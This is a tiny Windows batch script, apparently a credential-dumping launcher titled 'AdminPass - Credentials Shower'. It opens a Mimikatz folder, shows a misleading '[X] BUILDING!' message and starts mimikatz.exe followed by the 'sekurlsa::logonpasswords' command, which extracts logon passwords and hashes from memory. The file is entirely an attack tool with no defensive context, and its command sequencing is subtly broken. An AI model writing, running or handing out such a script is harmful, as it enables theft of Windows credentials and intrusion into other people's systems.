@echo off
title AdminPass - Credentials Shower
cd MimiKatz
cd Win32
echo [X] BUILDING!
pause
mimikatz.exe
sekurlsa::logonpasswords